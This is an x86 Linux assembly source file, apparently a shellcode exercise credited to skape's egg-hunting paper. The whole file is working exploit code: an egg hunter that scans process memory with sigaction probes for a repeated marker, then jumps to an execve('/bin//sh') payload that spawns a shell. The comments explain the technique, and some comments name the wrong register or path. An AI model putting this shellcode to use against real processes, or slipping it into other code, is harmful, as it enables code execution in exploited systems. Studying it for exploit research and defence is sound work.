; v0.5
; Credits: skape 
; Paper: Safely Searching Process Virtual Address Space - www.hick.org/code/skape/papers/egghunt-shellcode.pdf
;
global _start
section .text
_start:

; Egg Hunter section
next_page:
   or cx,0xfff       ; Get the last address of (each) PAGE_SIZE = 4KB, 0xFFF=4095d bits in edx

next_memory_in_page:
   inc ecx           ; increase ecx, this is the next memory offset/page

;check:
   push byte +0x43   ; sigaction syscall number (#define __NR_sigaction 67d = 43h)
   pop eax           ; load sigaction syscall into eax
   int 0x80          ; invoke sigaction syscall

   cmp al,0xf2       ; check for access violation (EFAULT) occurs. If an invalid address is found the EFAULT is return in EAX
                     ; as "0xFFFFFFF2" the lower bytes are compared "f2" and if the zero flag is set, program will go to
                     ; the next page.
   jz next_page      ; If EFAULT, try next_page by returning to start of 0xfff

;find_egg:
   mov eax,0x50905090; Egg is being loaded into eax (in reverse order). egg_marker must match the find_egg 
                     ; value otherwise the execve wont execute and program will end up with a "Segmentation fault (core dumped)
   mov edi,ecx       ; load pointer into edi register
   scasd             ; compare the dword (memory value) in edi with egg (stored in eax)

   jnz next_memory_in_page; 0x5           ; check whether egg has been found
   scasd             ; continue if egg has been found
   jnz next_memory_in_page; 0x5           ; return to increase edx only if the first egg has been found

;egg_found:
   jmp edi           ; egg found, edi points to the shellcode, go to shellcode

;egg_marker: (0x50905090) must be placed at the beginning of the shellcode
   nop               ; 0x90
   push eax          ; 0x50
   nop
   push eax
   nop
   push eax
   nop
   push eax

;execve
;int execve(const char *filename, char *const argv[], char *const envp[]);
;    execve("/bin/sh",            NULL,               NULL);
;    EAX 11    EBX                  ECX               EDX
;Building up th NULL terminated /bin//sh to be used in EXECVE, we are free to use other registers instead of EAX
   xor eax, eax   ; zeroing DWORD register so to build the null termination
   push eax       ; pushing the register on the stack
   push 0x68732f2f   ; 4 characters --- hs//
   push 0x6e69622f   ; 4 characters --- nib/
                  ; all these are being referenced by ESP as they are on the top of the stack
   mov ebx, esp   ; so we can load them in EBX

;Building up the THIRD (envp) argument of EXECVE
;char *const envp[] in our case should be null
   push eax       ; EAX is already null from the xor
   mov edx, esp   ; char *const envp[] is the 3rd parameter so it has to be stored in EDX
                  ; essentially ESP holds the zero-ed values from the "push eax"
                  ; and we copy the top of the stack (zero-ed) into EDX

;Building up SECOND (argv) argument of EXECVE
; char *const argv[] should be "address_of_bin_bash, null (0x00000000)
   push ebx       ; EBX is already on the stack and holds the address where ////bin/bash,0x0 begins
   mov ecx, esp   ; move the top of the stack to the ECX register

;Invoking EXECVE syscall number
   mov al, 11     ; execve syscall is 11
   int 0x80       ; Invoke syscall
